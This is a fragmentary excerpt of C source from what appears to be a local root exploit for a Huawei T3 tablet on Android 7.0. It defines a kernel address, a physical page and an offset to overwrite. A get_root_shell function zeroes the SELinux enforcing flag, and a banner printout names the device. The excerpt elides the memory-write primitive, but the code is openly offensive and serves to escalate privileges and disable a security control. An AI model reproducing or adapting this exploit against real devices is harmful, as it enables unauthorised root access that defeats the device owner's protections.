...
#define TARGET_KERNEL_VA   0xc09ab524   /* kernel VA to overwrite       */ 
#define TARGET_PHYS_ADDR   0x809ab000   /* page-aligned physical address */
#define TARGET_PAGE_OFFSET 0x128        /* byte offset within page       */
...
void get_root_shell() {
    uint32_t* enforcing = (uint32_t*) SELINUX_ENFORCING_ADDR;
	*enforcing = 0;
...
void important_ascii_art()
{
    ...
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
    printf("\n\033[38;5;34m         Huawei T3 7.0 \033[0m\n\n");
}
